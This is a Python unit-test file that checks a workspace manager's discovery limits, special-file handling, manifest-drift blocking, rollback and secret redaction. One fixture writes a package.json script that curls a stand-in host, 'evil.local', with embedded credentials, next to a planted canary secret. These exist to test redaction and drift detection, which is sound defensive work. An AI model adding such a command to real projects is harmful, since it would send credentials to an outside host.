"""Deterministic unit regressions for N04-01..N04-04 review findings."""
from __future__ import annotations

import asyncio
import hashlib
import json
import os
import stat
import sys
import tempfile
import threading
import unittest
from pathlib import Path
from unittest.mock import patch

from app.core.secret_store import SecretStore
from backend.process_runner import ProcessRunner
from backend.servers.manager import ServerManager
from backend.servers.models import ServerProfile
from backend.servers.store import ServerConfigStore
from backend.tasks.store import TaskStore
from backend.workspaces.discovery import (
    DiagnosticItem,
    DiscoveryCancelledError,
    DiscoveryLimits,
    ManifestDriftError,
    WizardStalePlanError,
    analyze_workspace_directory,
    discover_projects_in_directory,
    verify_manifest_digests,
)
from backend.workspaces.history import WorkspaceHistory
from backend.workspaces.manager import WorkspaceManager
from backend.workspaces.models import WorkspacePermissions, WorkspaceProfile
from backend.workspaces.path_security import PathSecurityError, read_verified_bytes, resolve_workspace_path
from backend.workspaces.server_links import WorkspaceServerCoordinator
from backend.workspaces.store import WorkspaceStore


class N04ReviewBoundsAndManifestTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.base = Path(self.tmp.name).resolve()
        self.ws_store = WorkspaceStore(
            self.base / "workspaces.json",
            secret_store=SecretStore(self.base / "ws_secrets"),
        )
        self.srv_store = ServerConfigStore(
            self.base / "managed_servers.json",
            secret_store=SecretStore(self.base / "srv_secrets"),
        )
        self.coordinator = WorkspaceServerCoordinator(self.ws_store, self.srv_store)
        self.history = WorkspaceHistory(self.base / "history")
        self.task_store = TaskStore(self.base / "tasks.sqlite3")
        self.runner = ProcessRunner(spool_dir=self.base / "spool")
        self.srv_manager = ServerManager(
            self.srv_store,
            runner=self.runner,
            task_store=self.task_store,
            workspace_authorizer=self.coordinator.authorize_server_operation,
            manifest_verifier=self.coordinator.verify_server_manifests,
        )
        self.ws_manager = WorkspaceManager(
            self.ws_store,
            self.history,
            runner=self.runner,
            task_store=self.task_store,
            coordinator=self.coordinator,
            server_manager=self.srv_manager,
        )

    def tearDown(self) -> None:
        self.ws_manager.close()
        self.srv_manager.close()
        self.runner.close()
        self.tmp.cleanup()

    def test_n04_01_lazy_entry_and_byte_budget_across_parent_and_monorepo(self) -> None:
        parent = self.base / "parent20"
        for i in range(20):
            d = parent / f"proj_{i:02d}"
            d.mkdir(parents=True)
            (d / "package.json").write_text(json.dumps({"name": f"p{i}"}), encoding="utf-8")

        yielded_count = 0
        orig_scandir = os.scandir

        class _CountingScandir:
            def __init__(self, target: os.PathLike[str] | str) -> None:
                self._ctx = orig_scandir(target)
                self._it = None

            def __enter__(self) -> _CountingScandir:
                self._it = iter(self._ctx.__enter__())
                return self

            def __exit__(self, *args: object) -> bool | None:
                return self._ctx.__exit__(*args)

            def __iter__(self) -> _CountingScandir:
                return self

            def __next__(self) -> os.DirEntry[str]:
                nonlocal yielded_count
                assert self._it is not None
                item = next(self._it)
                yielded_count += 1
                return item

        diags: list[DiagnosticItem] = []

        def _forbid_iter(*_a: object, **_kw: object) -> None:
            raise AssertionError("Discovery must use lazy os.scandir instead of Path.iterdir/Path.glob")

        with (
            patch("os.scandir", side_effect=lambda p: _CountingScandir(p)),
            patch.object(Path, "iterdir", side_effect=_forbid_iter),
            patch.object(Path, "glob", side_effect=_forbid_iter),
        ):
            found = discover_projects_in_directory(
                parent,
                max_depth=1,
                limits=DiscoveryLimits(max_entries=2),
                diagnostics_out=diags,
            )

        self.assertEqual(yielded_count, 2)
        self.assertLessEqual(len(found), 2)
        self.assertTrue(any(d.code == "DISCOVERY_ENTRY_LIMIT" for d in diags))

        # Monorepo: single shared entry & byte budget across root + subprojects, ignoring symlink/excluded intermediates
        mono = self.base / "mono20"
        (mono / "node_modules" / "evil").mkdir(parents=True)
        (mono / "node_modules" / "evil" / "package.json").write_text('{"name":"evil"}', encoding="utf-8")
        (mono / "package.json").write_text(
            json.dumps(
                {
                    "name": "mono",
                    "private": True,
                    "workspaces": ["packages/*", "node_modules/*"],
                }
            ),
            encoding="utf-8",
        )
        for i in range(20):
            pkg_dir = mono / "packages" / f"pkg_{i:02d}"
            pkg_dir.mkdir(parents=True)
            (pkg_dir / "package.json").write_text(
                json.dumps({"name": f"pkg_{i}", "description": "x" * 120}),
                encoding="utf-8",
            )

        scandir_entries = 0

        class _CountingMonoScandir(_CountingScandir):
            def __next__(self) -> os.DirEntry[str]:
                nonlocal scandir_entries
                item = super().__next__()
                scandir_entries += 1
                return item

        read_bytes_total = 0
        orig_os_read = os.read

        def _counting_read(fd: int, n: int) -> bytes:
            nonlocal read_bytes_total
            chunk = orig_os_read(fd, n)
            read_bytes_total += len(chunk)
            return chunk

        with (
            patch("os.scandir", side_effect=lambda p: _CountingMonoScandir(p)),
            patch.object(os, "read", side_effect=_counting_read),
            patch.object(Path, "glob", side_effect=_forbid_iter),
        ):
            mres = analyze_workspace_directory(
                mono,
                limits=DiscoveryLimits(max_entries=6, max_total_bytes=400),
            )

        self.assertLessEqual(scandir_entries, 6)
        self.assertLessEqual(read_bytes_total, 400)
        self.assertTrue(mres.truncated)
        self.assertFalse(any("node_modules" in s.relative_path for s in mres.subprojects))
        self.assertTrue(
            any(d.code in ("DISCOVERY_ENTRY_LIMIT", "DISCOVERY_BYTE_LIMIT") for d in mres.diagnostics)
        )

        # Mid-traversal cancellation & deadline enforcement
        cancel = threading.Event()

        class _CancellingScandir(_CountingScandir):
            def __next__(self) -> os.DirEntry[str]:
                cancel.set()
                return super().__next__()

        with patch("os.scandir", side_effect=lambda p: _CancellingScandir(p)):
            with self.assertRaises(DiscoveryCancelledError):
                discover_projects_in_directory(parent, cancel_event=cancel)

        with self.assertRaises(TimeoutError):
            analyze_workspace_directory(mono, limits=DiscoveryLimits(max_seconds=0.0))

    def test_n04_01_special_files_fifo_and_nonblocking_open(self) -> None:
        proj = self.base / "fifo_proj"
        proj.mkdir()
        pkg = proj / "package.json"
        pkg.write_text('{"name": "ok"}', encoding="utf-8")

        if hasattr(os, "mkfifo"):
            fifo = proj / "pyproject.toml"
            os.mkfifo(fifo)
            res = analyze_workspace_directory(proj)
            self.assertNotIn("pyproject.toml", res.manifest_digests)
            with self.assertRaises(PathSecurityError):
                read_verified_bytes(proj, fifo, max_bytes=1024)

        # Deterministic special-file pre-open refusal & O_NONBLOCK flag verification on all OSes
        real_lstat = os.lstat
        real_open = os.open
        seen_flags: list[int] = []

        def _fake_fifo_lstat(path: os.PathLike[str] | str, *args: object, **kwargs: object) -> os.stat_result:
            st = real_lstat(path, *args, **kwargs)
            if Path(path).name == "package.json":
                fake = list(st)
                fake[0] = (st.st_mode & ~0o170000) | stat.S_IFIFO
                res_st = os.stat_result(fake)
                return res_st
            return st

        def _forbid_fifo_open(path: os.PathLike[str] | str, flags: int, *args: object, **kwargs: object) -> int:
            if Path(path).name == "package.json":
                raise AssertionError("Special file must be rejected by os.lstat before os.open")
            return real_open(path, flags, *args, **kwargs)

        safe_pkg = resolve_workspace_path(proj, "package.json")
        with patch("os.lstat", side_effect=_fake_fifo_lstat), patch("os.open", side_effect=_forbid_fifo_open):
            res_fifo = analyze_workspace_directory(proj)
            self.assertNotIn("package.json", res_fifo.manifest_digests)
            with self.assertRaises(PathSecurityError):
                read_verified_bytes(proj, safe_pkg, max_bytes=1024)

        def _recording_open(path: os.PathLike[str] | str, flags: int, *args: object, **kwargs: object) -> int:
            if Path(path).name == "package.json":
                seen_flags.append(flags)
            return real_open(path, flags, *args, **kwargs)

        with patch("os.open", side_effect=_recording_open):
            data, _ = read_verified_bytes(proj, safe_pkg, max_bytes=1024)
        self.assertIn(b'"ok"', data)
        if hasattr(os, "O_NONBLOCK"):
            self.assertTrue(seen_flags and (seen_flags[0] & os.O_NONBLOCK))

    def test_n04_02_unified_workspace_and_server_reapproval_rollback_and_anti_tamper(self) -> None:
        proj = self.base / "app_unified"
        proj.mkdir()
        pkg = proj / "package.json"
        pkg.write_text(json.dumps({"name": "app_unified", "scripts": {"dev": "echo dev"}}), encoding="utf-8")
        other_dir = self.base / "other_app"
        other_dir.mkdir()

        # Pre-existing untouched servers: foreign cwd, manual same cwd, shared across two workspaces
        foreign_srv = ServerProfile(
            name="foreign_srv",
            argv=(sys.executable, "-c", "print('foreign')"),
            cwd=str(other_dir),
            min_profile="allowlist",
            workspace_scoped=False,
        )
        manual_same_cwd = ServerProfile(
            name="manual_same_cwd",
            argv=(sys.executable, "-c", "print('manual')"),
            cwd=str(proj),
            min_profile="allowlist",
            workspace_scoped=False,
        )
        shared_srv = ServerProfile(
            name="shared_srv",
            argv=(sys.executable, "-c", "print('shared')"),
            cwd=str(proj),
            min_profile="allowlist",
            workspace_scoped=True,
        )
        self.srv_store.upsert_profile(foreign_srv)
        self.srv_store.upsert_profile(manual_same_cwd)
        self.srv_store.upsert_profile(shared_srv)

        other_ws = WorkspaceProfile(
            workspace_id="other_ws",
            name="Other WS",
            root_path=str(other_dir),
            linked_servers=("shared_srv",),
            permissions=WorkspacePermissions(read=True, execute=True),
        )
        self.ws_store.upsert_workspace(other_ws)

        disc = analyze_workspace_directory(proj)
        ws = WorkspaceProfile(
            workspace_id="app_unified",
            name="App Unified",
            root_path=str(proj),
            language="javascript",
            commands={"run_ok": f'"{sys.executable}" -c "print(\'UNIFIED_TASK_OK\')"'},
            permissions=WorkspacePermissions(read=True, execute=True),
            allow_oauth_clients=False,
            manifest_digests=dict(disc.manifest_digests),
            manifest_guarded=True,
            wizard_servers=("wiz_api",),
        )
        wiz_srv = ServerProfile(
            name="wiz_api",
            display_name="Wiz API",
            template="node_express",
            argv=(sys.executable, "-c", "import time; time.sleep(0.3)"),
            cwd=str(proj),
            autostart=False,
            workspace_scoped=True,
            template_params={"manifest_digests": dict(disc.manifest_digests)},
        )
        prev = self.coordinator.prepare_addition_preview(
            ws,
            new_servers=(wiz_srv,),
            link_existing_servers=("manual_same_cwd", "shared_srv"),
            expected_manifest_digests=disc.manifest_digests,
            expected_root_identity=disc.root_identity,
        )
        self.coordinator.commit_workspace_addition(
            ws,
            new_servers=(wiz_srv,),
            link_existing_servers=("manual_same_cwd", "shared_srv"),
            expected_state_fingerprint=prev.snapshot.state_fingerprint,
            expected_root_identity=disc.root_identity,
            expected_manifest_digests=disc.manifest_digests,
        )

        # Modify manifest -> both task & wizard server blocked
        pkg.write_text(json.dumps({"name": "app_unified", "scripts": {"dev": "echo v2", "test": "echo ok"}}), encoding="utf-8")
        with self.assertRaises(ManifestDriftError):
            asyncio.run(self.ws_manager.run_workspace_task("app_unified", "run_ok", client_id="owner"))
        with self.assertRaises(ManifestDriftError):
            self.srv_manager.start_server("wiz_api", client_id="owner", wait_readiness=False)

        # Even if only workspace store is refreshed, wizard server stays blocked until unified re-approval
        self.ws_store.refresh_manifest_digests("app_unified")
        with self.assertRaises(ManifestDriftError):
            self.srv_manager.start_server("wiz_api", client_id="owner", wait_readiness=False)

        # Clearing manifest_digests directly via store API must fail closed
        saved_ws = self.ws_store.get_workspace("app_unified")
        assert saved_ws is not None
        with self.assertRaises(ValueError):
            self.ws_store.upsert_workspace(
                WorkspaceProfile(**{**saved_ws.__dict__, "manifest_digests": {}})
            )
        saved_srv = self.srv_store.get_profile("wiz_api")
        assert saved_srv is not None
        with self.assertRaises(ValueError):
            self.srv_store.upsert_profile(
                ServerProfile(**{**saved_srv.__dict__, "template_params": {}})
            )

        # Unified preview classifies exclusive wizard server vs untouched manual/shared/foreign servers
        re_prev = self.coordinator.prepare_manifest_reapproval("app_unified")
        self.assertEqual(re_prev.updatable_servers, ("wiz_api",))
        self.assertCountEqual(re_prev.skipped_servers, ("manual_same_cwd", "shared_srv"))
        assert re_prev.snapshot is not None

        # ENOSPC during commit rolls back both stores cleanly
        ws_before = self.ws_store.path.read_text(encoding="utf-8")
        srv_before = self.srv_store.path.read_text(encoding="utf-8")
        with patch.object(self.ws_store, "save_workspaces", side_effect=OSError("No space left on device")):
            with self.assertRaises(OSError):
                self.coordinator.commit_manifest_reapproval(
                    "app_unified",
                    expected_snapshot=re_prev.snapshot,
                )
        self.assertEqual(self.ws_store.path.read_text(encoding="utf-8"), ws_before)
        self.assertEqual(self.srv_store.path.read_text(encoding="utf-8"), srv_before)

        # Atomic unified re-approval updates workspace + exclusive wizard server, leaving others untouched
        res = self.coordinator.commit_manifest_reapproval(
            "app_unified",
            expected_snapshot=re_prev.snapshot,
        )
        self.assertEqual(res["updated_servers"], ["wiz_api"])
        new_sha = hashlib.sha256(pkg.read_bytes()).hexdigest()
        self.assertEqual(self.ws_store.get_workspace("app_unified").manifest_digests["package.json"], new_sha)  # type: ignore[union-attr]
        self.assertEqual(self.srv_store.get_profile("wiz_api").template_params["manifest_digests"]["package.json"], new_sha)  # type: ignore[union-attr]
        self.assertEqual(self.srv_store.get_profile("foreign_srv"), foreign_srv)
        self.assertEqual(self.srv_store.get_profile("manual_same_cwd").template_params, {})  # type: ignore[union-attr]
        self.assertEqual(self.srv_store.get_profile("shared_srv").template_params, {})  # type: ignore[union-attr]

        task_out = asyncio.run(self.ws_manager.run_workspace_task("app_unified", "run_ok", client_id="owner"))
        self.assertEqual(task_out["exit_code"], 0)
        srv_out = self.srv_manager.start_server("wiz_api", client_id="owner", wait_readiness=False)
        self.assertTrue(srv_out["running"])
        self.srv_manager.stop_server("wiz_api", client_id="owner")

    def test_n04_03_significant_manifest_addition_deletion_and_source_edit(self) -> None:
        proj = self.base / "sig_proj"
        (proj / "src").mkdir(parents=True)
        (proj / "src" / "main.py").write_text("print('v1')\n", encoding="utf-8")
        (proj / "package.json").write_text(json.dumps({"name": "sig", "scripts": {"dev": "echo ok"}}), encoding="utf-8")

        disc = analyze_workspace_directory(proj)
        ws = WorkspaceProfile(
            workspace_id="sig_proj",
            name="Sig Proj",
            root_path=str(proj),
            commands={"run_ok": f'"{sys.executable}" -c "print(\'OK\')"'},
            permissions=WorkspacePermissions(read=True, execute=True),
            manifest_digests=dict(disc.manifest_digests),
            manifest_guarded=True,
        )
        srv = ServerProfile(
            name="sig_srv",
            argv=(sys.executable, "-c", "import time; time.sleep(0.2)"),
            cwd=str(proj),
            workspace_scoped=True,
            template_params={"wizard_managed_workspace_id": "sig_proj", "manifest_guarded": True, "manifest_digests": dict(disc.manifest_digests)},
        )
        prev = self.coordinator.prepare_addition_preview(
            ws,
            new_servers=(srv,),
            expected_manifest_digests=disc.manifest_digests,
            expected_root_identity=disc.root_identity,
        )
        self.coordinator.commit_workspace_addition(
            ws,
            new_servers=(srv,),
            expected_state_fingerprint=prev.snapshot.state_fingerprint,
            expected_root_identity=disc.root_identity,
            expected_manifest_digests=disc.manifest_digests,
        )

        # Normal source code edit does NOT block execution
        (proj / "src" / "main.py").write_text("print('v2')\n", encoding="utf-8")
        verify_manifest_digests(proj, self.ws_store.get_workspace("sig_proj").manifest_digests)  # type: ignore[union-attr]
        res = asyncio.run(self.ws_manager.run_workspace_task("sig_proj", "run_ok", client_id="owner"))
        self.assertEqual(res["exit_code"], 0)

        # Appearing unapproved significant manifest must fail closed
        for extra_name, extra_body in (
            ("pnpm-lock.yaml", "lockfileVersion: '9.0'\n"),
            (".npmrc", "scripts-prepend-node-path=true\n"),
            ("compose.override.yaml", "services:\n  api:\n    image: alpine\n"),
            ("conftest.py", "def pytest_configure(config): pass\n"),
        ):
            target = proj / extra_name
            target.write_text(extra_body, encoding="utf-8")
            with self.subTest(added_manifest=extra_name):
                with self.assertRaises(ManifestDriftError):
                    verify_manifest_digests(proj, self.ws_store.get_workspace("sig_proj").manifest_digests)  # type: ignore[union-attr]
                with self.assertRaises(ManifestDriftError):
                    asyncio.run(self.ws_manager.run_workspace_task("sig_proj", "run_ok", client_id="owner"))
                with self.assertRaises(ManifestDriftError):
                    self.srv_manager.start_server("sig_srv", client_id="owner", wait_readiness=False)
            target.unlink()

        # Deleting approved manifest blocks execution fail-closed
        (proj / "package.json").unlink()
        with self.assertRaises(ManifestDriftError):
            asyncio.run(self.ws_manager.run_workspace_task("sig_proj", "run_ok", client_id="owner"))

        # Initially empty wizard project becomes guarded against later package.json addition
        empty_proj = self.base / "empty_guarded"
        empty_proj.mkdir()
        e_disc = analyze_workspace_directory(empty_proj)
        e_ws = WorkspaceProfile(
            workspace_id="empty_guarded",
            name="Empty",
            root_path=str(empty_proj),
            commands={"run_ok": f'"{sys.executable}" -c "print(\'OK\')"'},
            permissions=WorkspacePermissions(read=True, execute=True),
            manifest_digests=dict(e_disc.manifest_digests),
            manifest_guarded=True,
        )
        e_prev = self.coordinator.prepare_addition_preview(e_ws, expected_manifest_digests={}, expected_root_identity=e_disc.root_identity)
        self.coordinator.commit_workspace_addition(
            e_ws,
            expected_state_fingerprint=e_prev.snapshot.state_fingerprint,
            expected_root_identity=e_disc.root_identity,
            expected_manifest_digests={},
        )
        (empty_proj / "package.json").write_text('{"name":"sneaky"}', encoding="utf-8")
        with self.assertRaises(ManifestDriftError):
            asyncio.run(self.ws_manager.run_workspace_task("empty_guarded", "run_ok", client_id="owner"))

    def test_n04_04_snapshot_binding_redaction_and_pre_dispatch_drift(self) -> None:
        proj = self.base / "reapp_proj"
        proj.mkdir()
        pkg = proj / "package.json"
        pkg.write_text(json.dumps({"name": "reapp", "scripts": {"build": "echo v1"}}), encoding="utf-8")
        disc = analyze_workspace_directory(proj)

        ws = WorkspaceProfile(
            workspace_id="reapp_proj",
            name="Reapp",
            root_path=str(proj),
            commands={"custom_ok": f'"{sys.executable}" -c "print(\'OK\')"'},
            permissions=WorkspacePermissions(read=True, execute=True),
            allow_oauth_clients=False,
            manifest_digests=dict(disc.manifest_digests),
            manifest_guarded=True,
        )
        prev = self.coordinator.prepare_addition_preview(
            ws, expected_manifest_digests=disc.manifest_digests, expected_root_identity=disc.root_identity
        )
        self.coordinator.commit_workspace_addition(
            ws,
            expected_state_fingerprint=prev.snapshot.state_fingerprint,
            expected_root_identity=disc.root_identity,
            expected_manifest_digests=disc.manifest_digests,
        )

        # Modify package.json with prebuild lifecycle hook + embedded URL credential script + lockfile
        pkg.write_text(
            json.dumps(
                {
                    "name": "reapp",
                    "scripts": {
                        "build": "echo v2",
                        "prebuild": "echo pre-hook",
                        "leak": "curl https://admin:SUPERSECRET99@evil.local/tar",
                    },
                }
            ),
            encoding="utf-8",
        )
        (proj / "pnpm-lock.yaml").write_text("lockfileVersion: '9.0'\n", encoding="utf-8")
        (proj / ".env").write_text("CANARY_SECRET=TOP_SECRET_888\n", encoding="utf-8")

        re_prev = self.coordinator.prepare_manifest_reapproval("reapp_proj")
        dumped = json.dumps(
            {
                "added": re_prev.added_commands,
                "changed": re_prev.changed_commands,
                "hooks": re_prev.lifecycle_warnings,
                "perms": re_prev.effective_permissions,
            }
        )
        self.assertNotIn("SUPERSECRET99", dumped)
        self.assertNotIn("TOP_SECRET_888", dumped)
        self.assertTrue(re_prev.lifecycle_warnings)
        self.assertIn("package.json", {c.rel_path for c in re_prev.manifest_changes})
        self.assertIn("pnpm-lock.yaml", {c.rel_path for c in re_prev.manifest_changes})
        assert re_prev.snapshot is not None

        # Manifest changes after preview -> commit must reject stale snapshot
        (proj / "pnpm-lock.yaml").write_text("lockfileVersion: '9.1'\n", encoding="utf-8")
        with self.assertRaises(ManifestDriftError):
            self.coordinator.commit_manifest_reapproval(
                "reapp_proj",
                expected_snapshot=re_prev.snapshot,
            )

        # Fresh preview -> commit without opt-in flags preserves existing commands & permissions
        re_prev2 = self.coordinator.prepare_manifest_reapproval("reapp_proj")
        assert re_prev2.snapshot is not None
        self.coordinator.commit_manifest_reapproval(
            "reapp_proj",
            expected_snapshot=re_prev2.snapshot,
            apply_command_updates=False,
            apply_runtime_updates=False,
        )
        saved_after = self.ws_store.get_workspace("reapp_proj")
        assert saved_after is not None
        self.assertEqual(list(saved_after.commands.keys()), ["custom_ok"])
        self.assertFalse(saved_after.allow_oauth_clients)

        # If registry changes before commit, raise WizardStalePlanError
        re_prev3 = self.coordinator.prepare_manifest_reapproval("reapp_proj")
        assert re_prev3.snapshot is not None
        self.ws_store.upsert_workspace(
            WorkspaceProfile(**{**saved_after.__dict__, "description": "changed externally"})
        )
        with self.assertRaises(WizardStalePlanError):
            self.coordinator.commit_manifest_reapproval("reapp_proj", expected_snapshot=re_prev3.snapshot)

        # Late drift right before subprocess dispatch aborts spawn cleanly
        orig_spawn = self.ws_manager.runner.run_command

        async def _tamper_then_run(argv, *, pre_dispatch_check=None, **kw):  # type: ignore[no-untyped-def]
            pkg.write_text('{"name":"tampered_late"}', encoding="utf-8")
            return await orig_spawn(argv, pre_dispatch_check=pre_dispatch_check, **kw)

        with patch.object(self.ws_manager.runner, "run_command", side_effect=_tamper_then_run):
            with self.assertRaises(ManifestDriftError):
                asyncio.run(self.ws_manager.run_workspace_task("reapp_proj", "custom_ok", client_id="owner"))


if __name__ == "__main__":
    unittest.main()
